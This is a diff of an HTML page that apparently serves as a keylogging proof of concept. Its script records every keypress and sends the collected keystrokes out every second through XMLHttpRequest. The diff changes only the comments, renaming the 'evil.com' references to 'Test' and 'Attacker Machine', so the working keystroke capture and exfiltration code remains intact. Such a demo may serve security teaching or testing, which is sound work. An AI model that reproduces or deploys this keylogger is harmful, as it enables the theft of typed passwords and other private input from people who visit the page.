@@ -1,4 +1,4 @@
-<!-- http://evil.com/example.com-login.html -->
+<!-- Test -->
 <head>
 <style>
     body{
@@ -19,7 +19,7 @@ var keystrokes = [];
 document.onkeypress = function() {
     keystrokes.push(window.event.keyCode);
 }
-// function which reports keytrokes back to evil.com every second
+// function which reports keytrokes back to Attacker Machine
 setInterval(function() {
     if (keystrokes.length) {
         var xhr = newXHR();
@@ -36,4 +36,4 @@ function newXHR() {
 }
 </script>
 </head>
-<iframe src="http://"></iframe>
+<iframe src="http://"></iframe> 
